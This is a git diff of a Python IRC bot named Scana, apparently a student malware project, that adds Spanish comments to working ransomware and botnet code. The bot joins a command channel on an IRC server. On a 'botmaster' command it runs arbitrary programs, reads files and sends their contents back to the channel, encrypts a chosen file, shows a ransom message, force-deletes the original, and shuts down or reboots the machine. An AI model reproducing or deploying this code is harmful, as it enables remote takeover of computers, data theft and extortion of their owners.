@@ -1,3 +1,8 @@
+#-----------AUTORES-------------
+#       Espinosa Oscar
+#       Tadeo Diana
+#-------------------------------
+
 import socket, random, os, string, Crypto
 from Crypto.Cipher import AES
 from Crypto.Hash import SHA256
@@ -5,14 +10,17 @@ from Crypto.PublicKey import RSA
 from Crypto import Random
 from subprocess import Popen, PIPE, CalledProcessError
 import threading
- 
+
+#parametros de conexion al servidor IRC
 servidor = "192.168.1.30"
 canal = "#DianaOscar"
 nickName = ""
 puerto = 6667
 
+#autenticacion como botmaster
 isAuth = False
 
+#llave publica para cifrar los archivos
 rsa_str = '-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDOsK/43W2J7yz+wrCj0iRtpfA40b6G5JVqEsfkrDrI84nKxJylc4+FelPKobnpHhWpmVX2UZFxeSEzfiUPaDZHRr+PtoyvAKoI9u9AGgXKdk811Ti84y5JsavCjsyOjHzBIvXTunwLNbGVP2P2X+KVULjC9tWe7bSMIC52XxzpIQIDAQAB\n-----END PUBLIC KEY-----'
 rsa = RSA.importKey(rsa_str)
 
@@ -127,6 +135,10 @@ def isBotMaster(passwd):
     return True 
 
 def show_ransom_msg(fileName):
+    '''
+        Funcion que ejecuta el exe que muestra el mensaje de secuestro dando como parametro el nombre del achivo
+        que se ha cifrado
+    '''
     sub_stdout, sub_stderr = Popen(["C:\Users\malware\Documents\Scana\dist\msg.exe", fileName], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
 
 def do_command(irc, ircmsg):
@@ -150,6 +162,7 @@ def do_command(irc, ircmsg):
 
     #comando permitidos con autenticacion
     else:
+        #ejecucion de app dada como parametro
         if ircmsg.find("!@exec") != -1:
             command_rec = ircmsg.split("!@exec ")[1]
             command_rec = command_rec.split(" ")
@@ -158,44 +171,52 @@ def do_command(irc, ircmsg):
             #send_msg(irc, canal, sub_stdout.replace("\r\n", ", "))
             send_msg(irc, canal, "Hecho!\n\r")
         
+        #Muestra archivos en el directorio
         elif ircmsg.find("!@ls") != -1:
             sub_stdout, sub_stderr = Popen(["ls"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
             send_msg(irc, canal, sub_stdout.replace("\r\n", ", "))
-                
+
+        #Muestra contenido de un archivo  dado como argumento   
         elif ircmsg.find("!@cat") != -1:
             command_rec = ircmsg.split("!@cat ")[1]
             sub_stdout, sub_stderr = Popen(["cat", command_rec], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
             send_msg(irc, canal, sub_stdout)
 
+        #Muestra el directorio actual del bot
         elif ircmsg.find("!@pwd") != -1:
             sub_stdout, sub_stderr = Popen(["pwd"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
             send_msg(irc, canal, sub_stdout.replace("\r\n", ""))
 
+        #cifra archivo dado como argumento
         elif ircmsg.find("!@cifraArchivo") != -1:
             command_rec = ircmsg.split("!@cifraArchivo ")[1]
             #command_rec = command_rec.split(" ")
             send_msg(irc, canal, "Cifrando...")
             fileA=command_rec
             if os.path.exists(fileA):
+                #En un hilo independiente lanzamos la ejecucion del mensaje
                 threading.Thread(target=show_ransom_msg, args=(fileA,)).start()
                 llave = CreaLlave('hola')
                 Cifra(llave,fileA)
                 mensaje = "Cifrado exitoso!"
+                #se agregan comillas escapadas para no interpretar el posible espacio en la ruta del archivo
                 os.system("del /F /Q /A \""+ fileA + "\"")
                 send_msg(irc, canal, mensaje)
             else:
 		        send_msg(irc, canal, "No existe el archivo.")
 
-        
+        #Terminar el proceso de la Bot
         elif ircmsg.find("!@bye") != -1:
             send_msg(irc, canal, "Me voy a dormir zZ")
             #sub_stdout, sub_stderr = Popen(["taskkill", "/IM", "BotIRCMreboo.exe", "/F"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
             sub_stdout, sub_stderr = Popen(["taskkill", "/IM", "notepad.exe", "/F"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
         
+        #Apaga la pc inmediatamente
         elif ircmsg.find("!@shutdown") != -1:
             send_msg(irc, canal, "Adios ;)")
             sub_stdout, sub_stderr = Popen(["shutdown", "/s", "/t", "0"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
 
+        #Reinicia la pc inmediatamente
         elif ircmsg.find("!@reboot") != -1 :
             send_msg(irc, "Regreso en un minuto, voy al banio :O")
             sub_stdout, sub_stderr = Popen(["shutdown", "/r", "/t", "0"], stdout=PIPE, stdin=PIPE, stderr=PIPE).communicate()
@@ -204,6 +225,11 @@ def do_command(irc, ircmsg):
 
 
 def Scana_main():
+      '''
+        Funcion principal de Scana.
+        crea el socket de conexion IRC para comunicarse con el Botmaster
+        con un nick aleatorio. se conecta al canal definido de manera global
+      '''
       nickName=name_generator()
       irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       irc.connect((servidor, puerto))
@@ -211,10 +237,11 @@ def Scana_main():
       irc.send("NICK "+ nickName +"\n\r")
       irc.send("JOIN "+ canal +"\n\r")
 
+      #conexion persistente al servidor
       while 1:
             ircmsg = irc.recv(512)
             ircmsg = ircmsg.strip('\n\r')
             do_command(irc, ircmsg)
 
-
-Scana_main()
+if __name__ == "__main__":
+    Scana_main()
